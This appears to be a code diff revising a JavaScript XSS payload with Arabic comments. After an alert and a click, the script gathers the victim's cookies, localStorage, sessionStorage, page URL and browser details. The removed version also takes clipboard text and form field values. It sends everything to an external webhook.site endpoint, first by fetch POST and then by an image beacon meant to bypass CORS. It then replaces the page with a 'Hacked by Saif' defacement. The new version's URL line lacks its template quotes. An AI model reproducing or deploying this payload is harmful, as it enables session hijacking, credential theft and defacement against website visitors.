@@ -1,56 +1,33 @@
 <script>
-  alert("💀 Hacked by S7if 💀");
+alert("💀 Hacked by S7if 💀");
 
-  // بعد الضغط على OK أو أي Click في الصفحة
-  window.addEventListener("click", async () => {
-    try {
-      const everything = {
-        cookies: document.cookie,
-        localStorage: Object.fromEntries(Object.entries(localStorage)),
-        sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
-        url: location.href,
-        referrer: document.referrer,
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        time: new Date().toISOString(),
-        html: document.documentElement.outerHTML.slice(0, 3000)
-      };
+// بعد الضغط على OK أو أي مكان في الصفحة
+window.addEventListener("click", () => {
+  const data = {
+    cookies: document.cookie,
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage),
+    url: location.href,
+    referrer: document.referrer,
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    time: new Date().toISOString()
+  };
 
-      // Clipboard
-      try {
-        everything.clipboard = await navigator.clipboard.readText();
-      } catch (e) {
-        everything.clipboard = "Clipboard access denied";
-      }
+  // تشفير البيانات وتحويلها لـ URL-safe
+  const encoded = encodeURIComponent(JSON.stringify(data));
 
-      // Forms
-      everything.forms = Array.from(document.forms).map(f => ({
-        action: f.action,
-        method: f.method,
-        fields: Array.from(f.elements).map(e => ({
-          name: e.name,
-          type: e.type,
-          value: e.value
-        }))
-      }));
+  // إرسال البيانات باستخدام <img> لتجاوز CORS
+  const img = new Image();
+  img.src = https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb?exfil=${encoded};
+  document.body.appendChild(img);
 
-      // إرسال البيانات
-      await fetch("https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(everything)
-      });
-
-      // رسالة نهائية
-      document.body.innerHTML = `
-        <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#111;color:#0f0;font-size:2em;font-family:monospace;text-align:center;flex-direction:column;">
-          <div>👾 Hacked by <b>Saif</b> 👾</div>
-          <div style="font-size: 0.6em; margin-top: 20px;">Your session has been terminated.</div>
-        </div>
-      `;
-
-    } catch (err) {
-      console.error("Error during data exfiltration", err);
-    }
-  }, { once: true }); // يشتغل مرة واحدة بس
+  // شكل مرعب بعد كده
+  document.body.innerHTML = `
+    <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#0f0;font-size:2em;font-family:monospace;flex-direction:column;text-align:center;">
+      <div>👾 Hacked by <b>Saif</b> 👾</div>
+      <div style="font-size:0.7em;margin-top:20px;">All your data belongs to us</div>
+    </div>
+  `;
+}, { once: true });
 </script>
